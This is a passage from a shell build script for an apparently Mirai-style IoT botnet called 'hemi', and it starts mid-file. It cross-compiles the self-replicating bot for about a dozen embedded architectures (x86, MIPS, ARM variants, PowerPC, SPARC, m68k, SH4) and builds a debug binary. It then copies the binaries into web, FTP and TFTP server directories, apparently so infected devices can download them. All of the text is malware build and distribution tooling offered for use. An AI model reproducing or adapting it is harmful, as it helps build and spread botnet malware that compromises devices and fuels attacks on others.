...
compile_bot i586 hemi.x86 "-static -DSELFREP"
compile_bot mips hemi.mips "-static -DSELFREP"
compile_bot mipsel hemi.mpsl "-static -DSELFREP"
compile_bot armv4l hemi.arm "-static -DSELFREP"
compile_bot armv5l hemi.arm5 "-static -DSELFREP"
compile_bot armv6l hemi.arm6 "-static -DSELFREP"
compile_bot armv7l hemi.arm7 "-static -DSELFREP"
compile_bot powerpc hemi.ppc "-static -DSELFREP"
compile_bot sparc hemi.spc "-static -DSELFREP"
compile_bot m68k hemi.m68k "-static -DSELFREP"
compile_bot sh4 hemi.sh4 "-static -DSELFREP"

echo "Compiling: bot.dbg"
gcc -g bot/*.c -obot.dbg -DDEBUG -DSELFREP -w

cp release/hemi.* /var/www/html/bins
cp release/hemi.* /var/ftp
mv release/hemi.* /var/lib/tftpboot
rm -rf release
